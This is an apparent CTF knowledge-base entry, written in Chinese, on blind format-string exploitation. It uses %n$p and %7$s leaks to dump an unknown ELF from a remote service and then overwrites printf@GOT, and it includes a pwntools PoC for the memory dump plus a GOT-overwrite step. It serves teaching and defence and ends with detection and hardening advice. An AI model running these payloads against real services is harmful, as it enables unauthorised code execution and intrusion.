---
id: ctf-pwn-blind-format-string-dump-binary-got-hijack
title: 盲打格式化字符串：%n$p 定位栈 + %7$s+地址 dump 二进制，定位后门并覆写 printf GOT
type: scenario
domain: ctf
path: ctf/pwn
technique: blind-format-string-binary-dump-got-hijack
tags:
- pwn
- format-string
- blind
- binary-dump
- got-hijack
- stack-leak
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V161
  verified_at: '2026-11-06T13:49:48+08:00'
  notes: 已对照原文核对：%69$p 定位、%7$s+地址 dump ELF、后门/printf GOT 劫持脚本均一致；偏移按原文记录，未在本机复跑。
url: /docs/ctf/pwn/ctf-pwn-blind-format-string-dump-binary-got-hijack/
draft: false
kb_aliases:
- 盲打格式化字符串
- 无附件 pwn
- '%7$s dump 二进制'
- printf GOT 劫持
- 盲测格式化字符串
- no_file
---

## 一句话结论

在只给远程服务、没有二进制的盲打 Pwn 中，若存在格式化字符串漏洞，可先用 `%n$p` 找到栈上的返回地址/ELF 指针，再用 `%7$s` 加目标地址逐段读取内存，把 ELF 从 0x400000 开始 dump 出来；分析出后门函数或 libc 偏移后，用格式化字符串写 `printf@GOT` 为后门/`system`，下一次 `printf` 调用即劫持控制流。

## 原理

- **格式化字符串的任意读**：`%n$p` 读取第 n 个参数位置的指针值；`%7$s` 把第 7 个参数当作 `char *` 输出其指向的字符串。把目标地址放在 payload 末尾（按 8 字节对齐），即可让 `%7$s` 读取该地址开始的内存，直到遇到 NUL。
- **盲定位栈/ELF**：先枚举 `%1$p`…`%100$p`，找出指向栈、ELF 或 libc 的指针；用 `%69$p` 等泄漏返回地址，计算 ELF 基址（No PIE 时固定 0x400000）或栈地址。
- **dump 二进制**：从 `0x400000` 开始，每次 `%7$s` + 地址读取一段；遇到 NUL 会截断，脚本把读到的数据拼接并在长度为 0 时地址 +1 补 `\x00`，循环直到覆盖 ELF 的代码段/数据段，写出 `dump_bin_64`。
- **定位后门/plt**：在 dump 的 ELF 中用字符串/交叉引用找后门函数（如 `backdoor`/`print_flag`），或找 `printf@GOT`、`system@plt`；也可通过栈泄漏的 libc 地址算 libc 基址。
- **写 GOT**：用 `fmtstr_payload(offset, {printf_got: backdoor_addr})` 生成任意写 payload；下一次程序调用 `printf` 时跳到后门/`system`，配合 `/bin/sh` 或后门读取 flag。
- **为什么可行**：格式化字符串同时提供任意读与任意写；盲打的关键是先用读把“未知二进制”变成“已知”，再写 GOT。
- **前提**：格式化字符串参数偏移已知或可枚举；`%s` 读取不会崩溃（地址可读）；GOT 可写（Partial RELRO/No RELRO）。

## 触发条件

- 远程 Pwn 服务存在 `printf(user_input)`/`snprintf` 等格式化字符串漏洞。
- 程序没有提供二进制附件，或本地无法获取；需要盲测。
- 栈上存在可泄漏的 ELF/libc/栈指针，且 `%n$p` 偏移可枚举。
- GOT 可写（未 Full RELRO），或存在其它可写函数指针。
- 目标有后门函数、`system@plt` 或可通过 libc 偏移调用 `system`。

## 利用步骤

1. 枚举 `%1$p`…`%100$p`，记录每个偏移的值，识别 ELF 地址（0x400000/0x55…）、libc 地址（0x7f…）和栈地址（0x7ff…）。
2. 用 `%7$s` + `p64(addr)` 读取目标地址；从 ELF 基址开始逐段 dump，处理 NUL 截断，拼接成文件。
3. 用 `readelf`/IDA/Ghidra 分析 dump，找后门函数、`printf@GOT`、`system@plt`、`/bin/sh` 字符串。
4. 用栈泄漏计算 libc 基址（`__libc_start_main` 返回值 - 偏移），或直接用 ELF 内后门地址。
5. 计算格式化字符串参数偏移（如 6/7），用 `fmtstr_payload(6, {printf_got: target})` 生成写 payload。
6. 发送 payload，再触发一次 `printf`（如输入 `/bin/sh` 或菜单选项），获得 shell/flag。
7. 若 dump 失败，可改为纯盲打：只泄漏栈/libc，定位 `printf@GOT` 后直接写 `system`，并预先在栈/ BSS 放 `/bin/sh`。

## PoC

```python
from pwn import *

p = remote("target", 9999, ssl=True)

def sp(data):
    p.sendlineafter(b"> ", data)

# 1) 找偏移：%n$p 枚举
sp(b"%69$p=")
start_a = int(p.recvuntil(b"=", drop=True), 16)

# 2) 任意读：%7$s + 地址
def leak(addr):
    sp(b"_%7$stmp" + p64(addr))
    p.recvuntil(b"_")
    return p.recvuntil(b"tmp", drop=True)

# 3) dump ELF（从 0x400000 开始）
base = 0x400000
data = b""
while True:
    chunk = leak(base)
    data += chunk
    base += len(chunk)
    if not chunk:
        data += b"\x00"
        base += 1
    if len(data) > 0x20000:  # 按目标大小调整
        break

open("dump_bin_64", "wb").write(data)

# 4) 分析后门/printf GOT 后写 GOT
# printf_got = ...
# backdoor = ...
# sp(fmtstr_payload(6, {printf_got: backdoor}))
```

## 变体与关联

- 变体：用 `%s` 读 GOT 泄露 libc，再用 `%n` 写 GOT；或写 `__malloc_hook`/`__free_hook`（旧 glibc）。
- 变体：无 `%s` 可用时，用 `%p` 逐字节/逐 qword 泄漏栈与代码指针，结合已知 libc 数据库匹配版本。
- 变体：Full RELRO 下改栈返回地址、`exit_funcs`、`_IO_2_1_stdout_` 或 TLS/atexit 结构。
- 关联：[[binary-pwn-format-string-limited-nonstack-loop-condition-byte-rop]]（受限格式化字符串 ROP）、[[binary-pwn-format-string-malloc-hook-one-gadget]]（格式化字符串写 hook）、[[ctf-pwn-format-string-arbitrary-read-write-got]]（格式化字符串任意读写）。

## 检测与防御

- 防御：禁止把用户输入直接作为格式化字符串；使用 `printf("%s", user_input)` 或编译期 `-Wformat-security`。
- 防御：开启 Full RELRO、PIE、Canary；限制 `%n`（`FORTIFY_SOURCE`/`_FORTIFY_SOURCE=2` 仍不能替代正确用法）。
- 检测：请求中出现 `%p`、`%s`、`%n` 等格式化序列；同一连接高频枚举偏移；GOT 被改写导致函数跳转到非预期地址。
- 响应：隔离服务，审计 GOT/二进制完整性，修复格式化字符串入口，轮换凭据。
